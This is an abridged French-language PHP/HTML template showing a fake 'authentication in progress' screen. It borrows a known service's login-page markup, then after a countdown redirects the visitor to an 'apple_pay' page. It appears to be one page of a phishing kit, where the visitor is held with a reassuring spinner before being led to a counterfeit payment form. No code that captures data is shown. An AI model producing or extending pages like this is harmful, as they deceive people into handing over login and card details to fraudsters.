...
<html lang="fr" data-triggered="true">
  <head>
    ...
    <meta http-equiv="refresh" content="<?= $countdown ?>;URL=../apple_pay/index.php">
          ...
          <div>
            ...
            <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
              ...
              <h2 align="center" style="width:100%;color:#fff" data-uia="login-page-title">
                  <strong>Authentification en cours</strong>
                </h2>
                <p align="center"><img src="../login/assets/engrenage.gif" style="WIDTH: 100%"></p>
                <h2 align="center" style="width:100%;color:#fff" data-uia="login-page-title">
                  <strong>Veuillez patientez un instant pendant que nous traitons votre demande.</strong>
                </h2>
              </div>
            </div>
          </div>
